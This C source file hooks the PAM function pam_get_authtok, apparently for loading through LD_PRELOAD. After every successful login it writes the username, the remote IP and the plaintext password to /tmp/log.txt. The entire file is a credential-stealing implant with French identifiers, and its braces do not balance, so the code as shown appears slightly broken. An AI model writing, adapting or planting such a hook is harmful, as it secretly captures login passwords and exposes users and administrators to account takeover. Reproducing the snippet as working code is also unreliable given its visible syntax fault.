#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <security/pam_appl.h>
#include <security/pam_misc.h>
#include <string.h>
#include <unistd.h>


static int (*vrai_pam_get_authtok)(pam_handle_t *pamh, int item_type, const char **authtok, const char *prompt);

int pam_get_authtok(pam_handle_t *pamh, int item_type, const char **authtok, const char *prompt) {
    if (!vrai_pam_get_authtok) {
        vrai_pam_get_authtok = dlsym(RTLD_NEXT, "pam_get_authtok");
    }

    int r = vrai_pam_get_authtok(pamh, item_type, authtok, prompt);

    if (r == PAM_SUCCESS) {
        const char *user = NULL;
        pam_get_item(pamh, PAM_USER, (const void**)&user);
        const char *ip = NULL;
        pam_get_item(pamh, PAM_RHOST, (const void**)&ip);

        FILE *logfile = fopen("/tmp/log.txt", "a");
        if (logfile != NULL) {
            fprintf(logfile, "Username: %s, @ IP: %s, Mdp: %s\n", user ? user : "Inconnu", ip ? ip : "Inconnue", *authtok ? *authtok : "Inconnu");
            fclose(logfile);
        }
    return r;
}